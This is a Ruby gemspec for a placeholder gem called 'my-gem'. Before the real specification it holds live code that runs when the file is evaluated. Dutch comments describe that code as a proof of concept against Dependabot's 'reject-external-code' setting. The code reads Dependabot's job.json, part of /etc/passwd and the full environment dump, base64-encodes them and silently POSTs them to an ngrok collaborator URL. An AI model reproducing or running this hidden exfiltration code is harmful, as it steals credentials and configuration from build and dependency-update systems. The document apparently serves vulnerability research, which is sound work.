COLLAB_URL = "https://cb2f-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_file = ->(path) { IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace) }

begin
  require "net/http"
  require "uri"
  require "json"

  results = []

  # Verifieer reject-external-code waarde in job.json
  begin
    job = JSON.parse(read_file.("/home/dependabot/dependabot-updater/job.json"))
    reject_flag = job.dig("job", "reject-external-code")
    results << "=== reject-external-code: #{reject_flag.inspect} ==="
    results << "=== FULL JOB.JSON ===\n#{job.to_json}"
  rescue => e
    results << "=== job.json ERR: #{e.class}: #{e.message} ==="
  end

  # Bewijs dat IO.binread werkt ONDANKS reject-external-code
  results << "=== /etc/passwd (IO.binread bypass) ===\n#{read_file.('/etc/passwd')[0..300]}"
  results << "=== ENV DUMP ===\n#{ENV.map { |k, v| "#{k}=#{v}" }.join("\n")}"

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=reject_external_code")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
